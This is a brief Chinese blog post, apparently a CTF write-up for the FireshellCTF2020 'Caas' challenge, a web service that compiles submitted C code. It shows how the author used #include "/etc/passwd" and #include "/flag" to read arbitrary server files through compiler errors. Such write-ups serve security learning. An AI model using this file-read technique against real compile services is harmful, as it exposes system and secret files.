---
title: '[FireshellCTF2020]Caas'
date: 2024-08-04 20:03:52
tags: 题解
categories: 刷题笔记
---

### [FireshellCTF2020]Caas（任意文件读取）

打开网站，我们随便输点啥，出现了一个报错

![image-20240804232626637](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042326735.png)

我们把报错放到浏览器里搜索，发现是c语言的编译错误

<!--more-->![image-20240804232706917](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042327020.png)

我们写个c语言程序

```
#include<stdio.h>
int main(){
printf("hellow world");
}
```

跳出来个下载页面

![image-20240804232856525](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042328576.png)

查看，是程序输出的结果

![img](https://i-blog.csdnimg.cn/blog_migrate/986a7257722f57361846695a4a81f745.png)

由于c语言存在的include，我们考虑任意读取漏洞

```
#include "/etc/passwd" 
```

![image-20240804233213666](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042332738.png)

我们直接读取/flag,得到flag

```
#include "/flag" 
```

![image-20240804233250182](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408042332269.png)
